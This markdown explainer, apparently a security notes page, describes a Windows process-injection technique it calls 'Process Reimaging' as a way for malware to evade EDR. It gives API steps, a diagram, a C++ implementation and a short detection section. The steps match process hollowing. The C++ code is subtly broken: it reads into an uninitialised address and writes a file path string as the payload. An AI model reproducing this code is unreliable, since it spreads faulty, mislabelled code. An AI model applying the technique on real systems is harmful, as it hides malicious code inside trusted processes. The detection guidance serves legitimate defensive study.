# Process Reimaging
***Process Reimaging** is an advanced technique used by attackers to replace a running process with a different executable while maintaining the original process’s **Process ID (PID)**, **handles**, and **security context**.
This allows malware to blend in with legitimate processes, bypassing security monitoring and maintaining persistence on a compromised system.*

*Unlike other injection techniques (e.g., **DLL Injection**, **APC Injection**, or **Process Hollowing**), Process Reimaging **completely replaces the image of a process in memory** while keeping its execution context unchanged.*

## Why Use Process Reimaging?

- **Bypass security defenses** – Keeps the original process name and handles, making it harder for EDR (Endpoint Detection & Response) to detect.
- **Avoid antivirus detection** – AV solutions often trust running processes; replacing one allows execution of malicious code under a trusted process.
- **Persistence & privilege retention** – The process remains active under the same user context, avoiding suspicion.
- **Evade forensic analysis** – Since the original process name and metadata remain intact, analysis tools may not detect the injected code.

# How Process Reimaging Works
### 1. Selecting a Target Process
*The attacker selects a running process to replace with a malicious image. Common targets include:*
- **Explorer.exe** (common and always running).
- **Svchost.exe** (Windows service host, often overlooked).
- **Msiexec.exe** (used for installations, less suspicious).

### 2. Suspending the Process
*To ensure a seamless replacement, the attacker suspends the target process using:*

```NtSuspendProcess(hProcess);```

### 3. Unmapping the Original Executable from Memory
*The memory space occupied by the original process is **deallocated** using ```ZwUnmapViewOfSection```, removing the original image:*

```ZwUnmapViewOfSection(hProcess, baseAddress);```

### 4. Writing the Malicious Image
*A malicious executable is mapped into the **now-empty memory space**, replacing the original process. This involves:*

- **Allocating new memory** (```VirtualAllocEx```).
- **Writing the new image** (```WriteProcessMemory```).
- **Fixing necessary imports and relocation tables** (if required).

### 5. Adjusting Process Context
*To avoid detection, the attacker **modifies key process structures** such as:*

- **PEB (Process Environment Block)** – Updates process metadata.
- **Thread Context** – Adjusts execution flow to point to the new executable’s entry point.

*This is done using:*

```SetThreadContext(hThread, &ctx);```

### 6. Resuming Execution
*Once everything is set, the attacker **resumes the process**, now executing the malicious code under the disguise of the original process:*

```NtResumeProcess(hProcess);```

# Diagram of Process Reimaging Attack
```
        ┌──────────────────────────┐
        │ Attacker                 │
        │ (Injects Malicious Code) │
        └───────┬──────────────────┘
                │
                ▼
        ┌────────────────────────────┐
        │ Target Process (Legit)     │
        │ [1] Suspend Process        │◄─── NtSuspendProcess()
        │ [2] Unmap Original Image   │◄─── ZwUnmapViewOfSection()
        │ [3] Allocate Memory        │◄─── VirtualAllocEx()
        │ [4] Inject Malicious Code  │◄─── WriteProcessMemory()
        │ [5] Modify Process Context │◄─── SetThreadContext()
        │ [6] Resume Execution       │◄─── NtResumeProcess()
        └────────────────────────────┘
```
## Process Reimaging in Action
*C++ Code for Process Reimaging*
```
#include <windows.h>
#include <tlhelp32.h>
#include <winternl.h>

typedef NTSTATUS(WINAPI* pNtSuspendProcess)(HANDLE);
typedef NTSTATUS(WINAPI* pNtResumeProcess)(HANDLE);
typedef NTSTATUS(WINAPI* pZwUnmapViewOfSection)(HANDLE, PVOID);

void ProcessReimaging(DWORD pid, LPCSTR maliciousExe) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

    // Suspend Process
    pNtSuspendProcess NtSuspendProcess = (pNtSuspendProcess)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtSuspendProcess");
    NtSuspendProcess(hProcess);

    // Get PEB and unmap section
    PVOID baseAddress;
    SIZE_T bytesRead;
    ReadProcessMemory(hProcess, (PBYTE*)baseAddress, &baseAddress, sizeof(PVOID), &bytesRead);
    
    pZwUnmapViewOfSection ZwUnmapViewOfSection = (pZwUnmapViewOfSection)GetProcAddress(GetModuleHandle("ntdll.dll"), "ZwUnmapViewOfSection");
    ZwUnmapViewOfSection(hProcess, baseAddress);

    // Allocate new memory and write malicious code
    LPVOID pRemoteMemory = VirtualAllocEx(hProcess, baseAddress, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hProcess, pRemoteMemory, maliciousExe, strlen(maliciousExe) + 1, NULL);

    // Resume Process
    pNtResumeProcess NtResumeProcess = (pNtResumeProcess)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtResumeProcess");
    NtResumeProcess(hProcess);

    CloseHandle(hProcess);
}
```

# Detection & Defense Against Process Reimaging
*Although Process Reimaging is stealthy, defensive measures exist:*
## Behavioral Monitoring

- Detecting **NtSuspendProcess()** calls followed by **ZwUnmapViewOfSection()**.
- Identifying processes that suddenly change their **memory image**.
- Monitoring **suspicious memory allocations** (e.g., ```VirtualAllocEx``` with ```PAGE_EXECUTE_READWRITE```).

## Process Protection Mechanisms

- Enabling **Windows Defender Attack Surface Reduction (ASR)** to block suspicious process manipulations.
- Implementing **Code Integrity Policies** to restrict execution of unauthorized binaries.

## Advanced Forensic Detection

- Comparing a process’s **original image on disk** vs. **its memory image**.
- Checking process metadata in the **PEB (Process Environment Block)** for inconsistencies.
- Using **YARA rules** to detect injected code patterns.
